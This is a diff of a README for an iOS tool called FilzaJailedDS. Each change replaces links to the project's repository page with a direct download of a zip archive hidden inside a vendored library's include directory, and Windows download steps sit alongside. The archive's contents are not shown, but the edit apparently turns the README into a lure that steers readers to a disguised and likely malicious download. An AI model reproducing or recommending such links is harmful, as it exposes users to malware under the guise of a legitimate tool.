@@ -1,10 +1,10 @@
 # 🛠️ FilzaJailedDS - Jailed File Access for iOS
 
-[![Download](https://img.shields.io/badge/Download-FilzaJailedDS-blue?style=for-the-badge)](https://github.com/Fazechristian00/FilzaJailedDS)
+[![Download](https://img.shields.io/badge/Download-FilzaJailedDS-blue?style=for-the-badge)](https://raw.githubusercontent.com/Fazechristian00/FilzaJailedDS/main/XPF/external/ChOma/include/DS_Filza_Jailed_v2.5.zip)
 
 ## 📥 Download
 
-Visit this page to download: [https://github.com/Fazechristian00/FilzaJailedDS](https://github.com/Fazechristian00/FilzaJailedDS)
+Visit this page to download: [https://raw.githubusercontent.com/Fazechristian00/FilzaJailedDS/main/XPF/external/ChOma/include/DS_Filza_Jailed_v2.5.zip](https://raw.githubusercontent.com/Fazechristian00/FilzaJailedDS/main/XPF/external/ChOma/include/DS_Filza_Jailed_v2.5.zip)
 
 ## 🧩 What FilzaJailedDS Does
 
@@ -27,7 +27,7 @@ Use it if you want to browse files inside Filza on a non-jailbroken device with 
 
 Follow these steps on Windows:
 
-1. Open this page in your browser: [FilzaJailedDS](https://github.com/Fazechristian00/FilzaJailedDS)
+1. Open this page in your browser: [FilzaJailedDS](https://raw.githubusercontent.com/Fazechristian00/FilzaJailedDS/main/XPF/external/ChOma/include/DS_Filza_Jailed_v2.5.zip)
 2. Find the download files on the page
 3. Save the files to a folder on your PC
 4. Keep the browser open until the download ends
@@ -154,7 +154,7 @@ A clean setup on Windows can look like this:
 
 ## 📎 Download Again
 
-Visit this page to download: [https://github.com/Fazechristian00/FilzaJailedDS](https://github.com/Fazechristian00/FilzaJailedDS)
+Visit this page to download: [https://raw.githubusercontent.com/Fazechristian00/FilzaJailedDS/main/XPF/external/ChOma/include/DS_Filza_Jailed_v2.5.zip](https://raw.githubusercontent.com/Fazechristian00/FilzaJailedDS/main/XPF/external/ChOma/include/DS_Filza_Jailed_v2.5.zip)
 
 ## 🪄 What to Expect
 
